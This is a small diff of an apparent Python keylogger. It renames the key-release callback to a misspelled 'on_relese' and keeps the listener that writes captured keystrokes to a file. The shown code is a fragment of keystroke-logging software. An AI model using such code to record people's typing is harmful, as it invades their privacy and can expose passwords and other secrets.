@@ -24,9 +24,9 @@ def write_file(keys_list):
             elif k.find("key") == -1:
                 f.write(k)
 
-def on_release(key):
+def on_relese(key):
     if key == key.esc:
         return False
 
-with Listener(on_press = on_press, on_release = on_release) as listener:
+with Listener(on_press = on_press, on_release = on_relese) as listener:
     listener.join()
